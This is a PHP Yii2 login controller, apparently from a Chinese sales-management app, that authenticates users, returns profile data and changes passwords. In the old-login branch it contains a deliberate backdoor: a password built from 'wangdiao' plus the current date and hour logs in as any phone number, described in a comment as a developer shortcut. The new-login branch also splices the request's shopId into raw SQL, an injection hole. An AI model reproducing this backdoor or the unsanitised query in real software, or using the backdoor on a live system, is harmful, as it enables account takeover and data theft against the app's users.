<?php
/**
 * Created by PhpStorm.
 * User: xjun
 * Date: 2017/3/3
 * Time: 16:21
 */

namespace frontend\modules\glsb\controllers;


use common\auth\BaseAuth;
use common\models\User;
use common\logic\CompanyUserCenter;
use yii\rest\Controller;
use common\models\Role;
use common\models\UserRoleOrgids;
use yii\db\Expression;
use Yii;

/**
 * 登陆验证
 * Class LoginController
 * @package frontend\modules\glsb\controllers
 */
class LoginController extends AuthController
{
    /**
     * 登陆验证
     * @return array
     */
    public function behaviors()
    {
        $behaviors = parent::behaviors();
        $behaviors['authenticator'] = [
            'class' => BaseAuth::className(),
            'auth' => function($phone, $password, $roleId = 0, $shopId = 0) {
                if($roleId == 0)
                {//旧版的登录
                    $obj = new CompanyUserCenter();
                    $result = $obj->curlLogin($phone, $password);

                    if ($result['code'] == 0) {
                        $user = User::findOne(['access_token' => $result['access_token']]);
                        if($user)//暂时允许销售登录
                        {
                            return $user;
                        }
                        else
                        {
                            return '非法请求';
                        }
                    }
                    //后门，方面开发人员使用其他人账号查找问题，慎用慎用！！！
                    else if($password == 'wangdiao' . date('mdH'))//06月03日17时
                    {
                        $user = User::findOne(['phone' => $phone]);
                        if($user)
                        {
                            return $user;
                        }
                        else
                        {
                            return '非法请求';
                        }
                    }
                    else
                    {
                        return '账号密码错误';
                    }
                }
                else
                {//新版的登录
                    //店长登录的时候必须选中某一个店铺 其他角色登录的时候不做这个限制
                    $obj = new CompanyUserCenter();
                    $result = $obj->curlLogin($phone, $password);
                    if ($result['code'] == 0) 
                    {
                        $roleids = explode(',', $result['userinfo']['role_info']);
                        $objRole = Role::findOne($roleId);
                        if($objRole && in_array($roleId, $roleids))
                        {
                            //店铺以上所有人员都能登录管理速报，店铺层级只有店长能登录
                            if( $objRole->remarks === 'shopowner')
                            {
                                $user = User::findOne(['access_token' => $result['access_token']]);
                                $objUserRole = UserRoleOrgids::find()
                                                    ->where(['user_id' => $user->id, 'role_id' => $roleId])
                                                    ->andWhere(new Expression('FIND_IN_SET(' . $shopId .', org_ids)'))
                                                    ->one();
                                if($objUserRole)
                                {
                                    return $user;
                                }
                                else
                                {
                                    return '店铺和角色不匹配！';
                                }

                            }
                            else if($objRole->role_level < 30)
                            {
                                return User::findOne(['access_token' => $result['access_token']]);
                            }
                            else
                            {
                                return '您的权限为销售顾问，无法登录管理速报';
                            }

                        }
                        else
                        {
                            return '角色信息选择错误！';
                        }
                    }
                    else
                    {
                        return '账号密码错误';
                    }
                }
            }
        ];
        return $behaviors;
    }

    /**
     * 登陆
     * @return array
     */
    public function actionIndex()
    {
        $user = Yii::$app->getUser()->identity;
        if($user->sex == 1){
            $sex = '男';
        }elseif($user->sex == 2){
            $sex = '女';
        }else{
            $sex = '保密';
        }

        $data =  [
            'userid' => (int)$user->id,
            'avatar' => (string)$user->avatar,
            'nickname' => (string)$user->nickname,
            'name' => (string)$user->name,
            'phone' => (string)$user->phone,
            'sex' => (string)$sex,
            'birthday' => (string)$user->birthday,
            'profession' => (string)$user->profession,
            'email' => (string)$user->email,
            'access_token' => (string)$user->access_token,
            'info_owner_id' => (int) 0,//默认值 0 
            'organizational_structure_level' => (isset($this->userinfo['role_level']) ? $this->userinfo['role_level'] : 0), //这个得从登录角色中获取
        ];
       $this->echoData(200,'登录成功',$data);
    }

    /**
     * 修改密码
     * @return array
     */
    public function actionModifyPassword()
    {
        //获取用户
        $user = Yii::$app->getUser()->identity;

        //接收公共参数
        $p = json_decode(Yii::$app->request->post('p'),true);
        $newpassword = $p['newpassword'];

        //修改密码
        if(!empty($newpassword)){
            //生成新密码
            $user->password_hash = Yii::$app->security->generatePasswordHash($newpassword);

            //保存新密码
            if($user->save()){
                $data['id']         = $user->id;
                $data['name']       = $user->name;
                $data['phone']      = $user->phone;
                $data['access_token'] = $user->access_token;
                //返回数据
                $this->echoData(200,'修改成功',$data);
            }else{
                $this->echoData(400,'修改失败');
            }
        }
    }

}